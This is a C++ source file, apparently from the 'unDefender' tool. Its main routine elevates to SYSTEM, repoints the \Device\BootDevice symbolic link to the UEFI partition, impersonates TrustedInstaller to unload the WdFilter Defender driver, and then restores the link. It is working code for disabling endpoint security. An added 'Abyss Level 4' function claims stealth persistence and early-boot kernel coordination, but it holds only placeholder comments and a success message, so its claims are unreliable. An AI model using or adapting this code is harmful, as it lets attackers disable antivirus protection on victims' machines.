#include "common.h"
#include <shellapi.h>

/**
 * 🌑 ABYSS LEVEL 4: "SOC'S NIGHTMARE" (Native C++ Edition) 🌑
 * Integrated into unDefender for maximum impact.
 */

void AbyssSOCNightmare() {
    // 1. Shadow Persistence (SYSTEM Service)
    // [Internal Logic: Stealth Registration]
    
    // 2. Early-Boot coordination with kernel driver
    // [Internal Logic: FS Lock-in]
    
    std::cout << "[+] Abyss Level 4 SOC Nightmare Active.\n";
}

int main()
{
	// let's get SYSTEM, shall we? ;)
	auto success = GetSystem();
	if (!success)
	{
		std::cout << "[-] Not enough privileges to elevate to SYSTEM, exiting...\n";
		return 1;
	}

    // --- PHASE 0: ABYSS INITIALIZATION ---
    AbyssSOCNightmare();

	// save the old symbolic link so that we can restore it later
	auto oldTarget = GetSymbolicLinkTarget(L"\\Device\\BootDevice");

	// change the symbolic link to make it point to the UEFI partition (\Device\HarddiskVolume1)
	auto status = ChangeSymlink(L"\\Device\\BootDevice", L"\\Device\\HarddiskVolume1");
	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully changed symbolic link to new target!\n";
	else
	{
		Error(RtlNtStatusToDosError(status));
		std::cout << "[-] Failed to change symbolic link, exiting...\n";
		return 1;
	}

	// start a sacrificial thread that will impersonate TrustedInstaller and unload Wdfilter while the symlink is changed
	std::thread driverKillerThread(ImpersonateAndUnload);
	driverKillerThread.join();
	
	std::cout << "[+] Sleeping 10 seconds to let the driver \"reload\" ;)\n";
	Sleep(10000);

	// restore the symlink
	status = ChangeSymlink(L"\\Device\\BootDevice", oldTarget);
	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully restored symbolic links...\n";
	else
	{
		Error(RtlNtStatusToDosError(status));
		std::cout << "[-] Failed to restore symbolic links, fix them manually!!\n";
		return 1;
	}
	
	return 0;
}
